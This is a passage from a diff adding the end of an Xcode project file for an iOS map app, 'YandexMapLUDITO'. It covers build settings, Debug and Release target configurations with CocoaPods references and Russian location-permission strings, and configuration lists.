+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				DEVELOPMENT_TEAM = J2A3H7RHBB;
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		AE08936E2E3BA80300844259 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 96FB6C8E33D9023247AFD54E /* Pods-YandexMapLUDITO.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = J2A3H7RHBB;
+				ENABLE_PREVIEWS = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "YandexMapLUDITO-Info.plist";
+				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.navigation";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "Может потребоваться для отслеживания движения местоположения.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Мы будем использовать ваше местоположение для отображения на карте.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIStatusBarStyle = UIStatusBarStyleDarkContent;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = uz.com.kuvandikov.YandexMapLUDITO;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		AE08936F2E3BA80300844259 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 55D629D8335F8A08F6D204E4 /* Pods-YandexMapLUDITO.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = J2A3H7RHBB;
+				ENABLE_PREVIEWS = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "YandexMapLUDITO-Info.plist";
+				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.navigation";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "Может потребоваться для отслеживания движения местоположения.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Мы будем использовать ваше местоположение для отображения на карте.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIStatusBarStyle = UIStatusBarStyleDarkContent;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = uz.com.kuvandikov.YandexMapLUDITO;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		AE08935D2E3BA80200844259 /* Build configuration list for PBXProject "YandexMapLUDITO" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				AE08936B2E3BA80300844259 /* Debug */,
+				AE08936C2E3BA80300844259 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		AE08936D2E3BA80300844259 /* Build configuration list for PBXNativeTarget "YandexMapLUDITO" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				AE08936E2E3BA80300844259 /* Debug */,
+				AE08936F2E3BA80300844259 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = AE08935A2E3BA80200844259 /* Project object */;
+}
